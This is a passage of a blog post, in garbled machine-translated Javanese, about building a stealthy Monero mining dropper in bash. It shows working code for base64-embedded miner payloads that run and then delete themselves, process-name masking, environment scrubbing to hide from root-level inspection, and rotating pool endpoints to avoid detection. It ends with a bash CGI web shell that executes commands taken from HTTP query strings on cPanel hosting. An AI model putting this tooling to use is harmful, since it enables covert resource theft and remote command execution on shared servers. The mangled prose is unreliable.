                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Kita nulis daemon, yaiku proses sing umure dawa, lan nggunakake akeh deskripsi file, pancen pengin ngresiki supaya ora kedadeyan<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Fungsi iki gumantung<a href=https://ipinfo.io/> ipinfo</a> kanggo nemtokake wilayah buruh, sing ngidini nyetel sawetara logika sing gumantung ing wilayah,<a href=\assets/posts/geoip.json> geoip.json</a> klompok negara dadi wilayah, amarga kita pengin wilayah level paling dhuwur, lan ora kasengsem karo negara tartamtu.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash duwe dhukungan kanggo sambungan tcp, kanthi duwe abstraksi<code>/dev/tcp</code> (uga kanggo udp, nanging umume katon ora aktif nalika nggawe, dadi sampeyan ora bisa ngandel). File-file kasebut minangka barang sing gampang ditemokake, dudu bagean saka linux<code>/dev</code> wit.<p>Perlu disebutake uga sistem ngunci kanggo nangani konkurensi antarane lowongan kerja bash. Kanggo ngidini pirang-pirang proyek bisa digunakake nganggo kunci, kabeh kudu nuduhake deskriptor file, mula kita uga<code>locker</code> sing uga dadi tugas, kudu diwiwiti sadurunge proyek liyane sing pengin nggunakake kunci. Loker mung diwaca<code>stdin</code> ngenteni panjaluk kunci, nanggapi<code>stdout</code> gumantung saka negara boolean saiki sing disimpen ing variabel. Aku ora njamin manawa pendekatan iki bebas balapan, nanging bisa uga digunakake kanthi sopan, ing tangan liyane, aku nemokake deskriptor file ora bisa dipercaya banget, amarga aku nyangka ana sawetara buffer sing ora bisa disiram ing endi wae<em> pipa</em> lan pungkasane tekan tombol buntu (tegese sampeyan ora bisa gumantung karo loker sing menehi wangsulan kabeh).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Ngresiki uwuh ... program bash kompleks pungkasan nggunakake macem-macem variabel, lan yen sampeyan nyiksa ruang global mula bakal kembung. Yen sampeyan ngetrapake proyek cangkang, kabeh bakal entuk warisan lingkungan (sing bisa diduplikasi kanthi efektif, ora dituduhake), sampeyan bisa cepet mangan kanthi cepet<code>100M</code> memori, ora apik. Uga kita pengin banget dadi profil sing kurang. Ing skenario penyebaran, mungsuh<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> bisa duwe akses root lan informasi lengkap babagan proses kita<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , lan sampeyan ngerti ... saben proses ngemot informasi babagan printah lengkap sing diwiwiti, lan variabel lingkungan sing diekspor.<h2 id=configuration><a class=header-anchor href=#configuration> Konfigurasi</a></h2><p>Sawise duwe lingkungan, lan alat, kita kudu nyetel panambang kanggo mesin sing lagi mlaku, langkah-langkah konfigurasi ing kode semu:<ul><li><p>jeneng proses kanggo penambang<li><p>infos inang (ram / intine / cache /<code>ENV_VARS</code>)<li><p>versi konfigurasi<li><p><code>worker_id</code> kanggo penambang (saka ip lan host)<li><p>ip / port kanggo sambungan</ul><p>Milih jeneng kanggo proses kasebut dibutuhake<em> ndhelikake</em> kasunyatan manawa kita mbukak penambang, nanging ora mung ganti jeneng binar, nanging duwe dhaptar<strong> topeng</strong> kanggo calon calon (file teks biasa sing saben baris dadi topeng):<ul><li><p>pilih topeng kanthi acak<li><p>rubah elemen buntut saka senar (kabeh kajaba sing pertama) kanggo entuk prentah proses sing beda-beda. Saiki kita duwe senar kaya<code>cmd --arg2 --arg1 --arg3</code> . Iki topeng penambang, kita mbukak binar<em> tanpa</em> bantahan, nanging kayane kita miwiti prentah<code>cmd</code> kanthi bantahan<code>--arg1 --arg2 --arg3</code> . Spasi lan dash diidini ing jeneng file, mula luwih becik mbukak binar kaya iki, kayane ora katon linux ing antarane sing bisa dieksekusi lan bantahan nalika nyimpen prentah proses.<p>Konfigurasi penambang kanthi otomatis dimuat saka<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Hashrate</a></h3><p>, suwe-suwe, penambang hulu entuk akeh<strong> nyetel otomatis</strong> fitur, saengga dadi bagean saka skripku sing keluwih, nanging bedane antara hulu lan hulu ing kene yaiku tujuan hulu yaiku maksimal<em> kinerja</em> , dene tujuane yaiku maksimal<em> efisiensi lan obfuscation</em> , kita ora pengin nyalip sistem kasebut, kita pengin ngeculake sethithik tanpa gangguan layanan.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Kanggo iki, kita butuh pangerten sing luwih akeh babagan lingkungan, ing<code>l2/l3</code> struktur cache prosesor, ram, lan intine, lan prosesor saiki<em> rata-rata</em> mbukak lan cpu<em> panggunaan</em>. Aku nyoba mbangun a<a href=https://en.wikipedia.org/wiki/Finite-state_machine> mesin negara</a> ing bash sing bakal diwiwiti saka minimal minimal lan nyoba konfigurasi sing beda kanthi alon-alon ing paling rata-rata. Yaiku a<strong> ageng banget</strong> sampah gaweyan sampah karo<a href=https://en.wikipedia.org/wiki/Technical_debt> utang teknis</a> sing bangkrut kanthi cepet lan biasane dibuwang, mung sisa-sisa sing ana ing codebase.<p>Cepet kabeh tuning otomatis jumbo iki, kita mung nggawe penambang turu gumantung saka panggunaan / beban host, iki dibutuhake modifikasi penambang<code>sleep</code> ing antarane panenane utas, lan sawetara perbaikan ing watchdog konfigurasi<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , sing bakal ngidini kita mbukak maneh jumlah turu nalika proses. Logika luwih disederhanakake lan katon kaya iki:<ul><li><p>yen panggunaan ndhuwur / ngisor $ TARGET_USAGE (Â± wates kesalahan) nambah / nyuda turu<li><p>yen rata-rata mbukak ing<code>1m</code> ing ndhuwur / ngisor $ TARGET_LOAD ngaso / nerusake penambangan</ul><h3 id=connection><a class=header-anchor href=#connection> Sambungan</a></h3><p>Ing babak bash, kita nuduhake keperluan kanggo sambungan. Napa kita butuh iki? Amarga kita butuh keragaman; mung kode hard endpoint menyang konfigurasi ora bakal suwe, yen ana sing katon curiga, lan duwe kegiatan jaringan, IP ditandhani.<p>Ing wiwitan, kita eksperimen karo sawetara metode:<ul><li><p>nggunakake<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> proksi</a> kanggo kakehan panggilan jaringan penambang, nanging dibutuhake penambang dibangun karo perpustakaan dinamis, lan sampeyan kudu ngirim nganggo muatan, dadi ora praktis.<li><p>mlaku a<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> trowongan maju</a> jejer karo penambang: iki nduwe akeh konfigurasi overhead, amarga saiki kita ngonfigurasi rong proses ing saben penyebaran, sing akehe kewan omo.</ul><p>Pungkasane, kita mung ngrampungake dhaptar endpoint, disimpen ing variabel bash, milih kanthi acak. Sambungan mesthi dienkripsi. Apa titik pungkasan iki? Forwarders menyang proxy sing bakal nangani proyek para penambang.<p>Napa kita prelu a<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> proxy pertambangan</a> ? Aku ora nate kliwat ~ 100 sambungan sing padha, dadi proksi ora perlu banget kanggo mbukak jaringan, nanging luwih gampang kanggo negosiasi algoritma hashing, lan nyedhiyakake target kesulitan sing beda kanggo macem-macem penambang, kanggo nyegah para penambang bisa nggarap<strong> kangelan</strong> target sing butuh wektu akeh banget kanggo ngrampungake lan ngindhari risiko mbuwang komputasi ing proyek sing durung rampung.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Piranti lunak kolam uga mbutuhake sawetara modifikasi amarga iklan kanthi seneng dadi proxy ing panjaluk http kosong ...<em> sing kudu diatur wektu</em> , lan garpu nambahake akses kontrol mula adhedhasar mods kasebut.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Ngedit json</a></h3><p>Nindakake modifikasi menyang file json kanthi bash, kita entuk sawetara substitusi, lan sawetara regex. Wiwitane kita gumantung karo<code>envsubst</code> binar kanggo ngetrapake variabel, mula kita bakal maju kanthi lengkap<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> kanthi logika iki:<ul><li><p>maca template config<li><p>ganti kabeh kuotasi nganggo senar esoterik (kaya<code>_#_#</code>)<li><p><code>eval</code> cithakan<li><p>ganti kabeh kedadeyan esoterik kanthi kuotasi</ul><p>Loro saka ngindhari proses sub, kaluwihan liya yaiku supaya bisa entuk kemampuan bash lengkap ing template. Kanggo maca lan nulis tanpa template, kita kudu gumantung karo kemampuan regex bash:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Iki mung ngidini kita ngowahi baris siji, kanggo entri multi-baris sing dianggep baris kapisan..nanging cukup kanggo kasus panggunaan.<h2 id=runtime><a class=header-anchor href=#runtime> Runtime</a></h2><p>Kadospundi tampilan runtime kita? Kita duwe proses bash utama sing nglakokake loop utama, banjur sub-proses panambang, sub-proses monitor cpu, loker lan tuner. Sing meh sawetara.<p>Kaping pisanan kita pengin nggawe manawa ana kesalahan, kita ora bakal nggawe kekacoan, iki tegese kita nggunakake jebakan bash kanggo ngresiki nalika mungkasi<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> ngilangi jebakan kanggo nyegah recursion. Jebakan kasebut bisa mateni kabeh proyek lan ngilangi lingkungan kerja.<p>Wayahe miwiti panambang, sing disimpen minangka variabel bash ing enkoding base64. Kita lebokake ing filesystem, banjur buwang config, eksekusi penambang, lan copot penambang lan config. Ing linux sampeyan bisa mbusak proses sing bisa ditindakake, (ing windows iki ora diidini).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Nalika panambang mlaku, ing sistem file mung ana<code>.. /</code> direktori karo a<code>b64</code> link ing.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Quirk sing nggegirisi sing ditemokake karo bash nalika enkode penambang yaiku menehi variabel kanthi subhell kanthi kuotasi<code>myvar="$(something)"</code> nyebabake panggunaan memori terus meningkat, iki angel debug lan durung nemokake sebab kenapa tumindak kaya ngono, mula wae tugas kasebut kudu ora dikutip. Panyusunan rampung karo<em> herestrings</em> yaiku abstraksi liwat file-file sementara, variabel kasebut dibuwang menyang file sing banjur dilebokake ing proses kasebut.<p>Penambang mlaku dawa:<ul><li><p>nalika bener<ul><li><p>mandheg penambang<li><p>mbusak config<li><p>miwiti penambang<li><p>nalika bener<ul><li><p>miwiti daemon<ul><li><p>nalika panambang lagi mlaku<ul><li><p>maca output saka penambang<li><p>pilih tumindak penambang adhedhasar garis output</ul></ul><li><p>yen panambang ora mlaku: pedhot</ul><li><p>turu</ul></ul><p>Baris output dicocogake karo sawetara regex:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Daemon nangani kasus ing endi<ul><li><p>sambungan menyang titik pungkasan menehi kesalahan (pilih titik pungkasan acak anyar)<li><p>pangowahan algoritma hashing (nyetel wektu turu lan konfigurasi ad-hoc)<li><p>masalah penambang (urip maneh penambang).</ul><p>Suwe-suwe ana dhukungan kanggo dashboard komando lan kontrol, sing ngidini bisa miwiti maneh manual, nanging amarga panggunaane minimal, mula dibuwang, lan titik pungkasan diganti karo sambungan kolam alternatif, uga proses restart ora stabil, kompleks. .. Kayata utang teknologi liyane. Nanging, ngidini njupuk maneh muatan sing dianyari lan nyiyapake maneh kabeh konfigurasi kanthi cepet, sing pancen apik banget, trampolin utama.<h2 id=debugging><a class=header-anchor href=#debugging> Debugging</a></h2><p>Ana telung keperluan utama<ul><li><p>ngaktifake / mateni nglacak blok kode (kita ora pengin nglacak binari enkode b64 ing variabel ..)<li><p>fungsi sing gampang kanggo format log<li><p>panji sing bakal ngaktifake logging verosa nalika runtime kapan penambang diwiwiti.<ul><li><p>nindakake file kasebut<code>.debug</code> ana?<ul><li><p>ngaktifake logging verbose</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Target penyebaran</a></h2><p>Persiyapan iki wis dites ing 3 jinis host:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Wadhah utawa VM sing dadi tuan rumah dhewe</a></h3><p>Akeh panyedhiya hosting ora seneng pertambangan amarga sumber daya CPU asring dienggo bareng karo pirang-pirang pangguna, lan piranti lunak penambangan bisa kanthi gampang nyuda node host sing kena pengaruh kanggo pangguna liyane. Iki bisa bener sanajan wektu pangguna CPU ora winates, amarga algoritma hashing bisa ngatasi kabeh lapisan cache CPU yen cache dituduhake ing antarane kabeh inti CPU.<p>Kita pengin nggunakake<em> adil</em> nuduhake sumber tanpa dilarang, iku kasus panggunaan sing apik kanggo dropper siluman amarga wis ngerti panggunaan host, tegese<em> kudune</em> tetep jinis ing [AUP]. Ora ana langkah ekstra nalika ngatasi penyebaran sing diatur dhewe, mung skrip peluncur, bisa uga ditambahake ing urutan boot utawa diluncurake kanthi manual.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> hosting web adhedhasar cPanel</a></h3><p>Rencana langganan hosting web biasane ditawakake liwat [cPanel]. Maneh ing kene, kita nggunakake rencana langganan pribadi sing duwe wates sumber daya sing cukup, ing sisih liya rencana gratis ora ana watesan sing konyol<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel ngidini sampeyan nemtokake pawang kanggo ekstensi file sing beda-beda, iki ngidini kita nglakokake skrip cangkang liwat<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> kanthi panjaluk http tumrap skrip cangkang sing diunggah ing server. Antarmuka semacam iki katon kaya cangkang web<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Cangkang web bash sing sederhana<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span><span class=hljs-comment>## don't use -n, redirect fd for bcompat</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>builtin</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>printf</span><span class=hljs-string>'%b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span><span class=hljs-built_in>printf</span><span class=hljs-string>'exec %b'</span><span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span><span class=hljs-keyword>fi</span>
